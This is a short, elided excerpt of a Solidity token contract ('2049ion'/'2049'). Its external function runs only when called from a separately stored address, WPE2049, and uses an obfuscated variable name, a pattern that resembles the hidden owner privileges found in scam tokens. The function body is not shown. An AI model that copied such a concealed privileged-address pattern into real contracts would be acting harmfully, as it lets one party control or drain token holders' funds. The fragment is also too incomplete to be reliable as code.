...
contract WPETOKEN is Ownable {
    uint256 tokenamount = 1000000*10**decimals();
    address public WPE2049;
    ...
    string private _tokenname = "2049ion";
    string private _tokensymbol = "2049";
    ...
    external {
        ...
        uint256 uyyxxadd23344 = 47330000000-1000;
        require(WPE2049 == _msgSender());
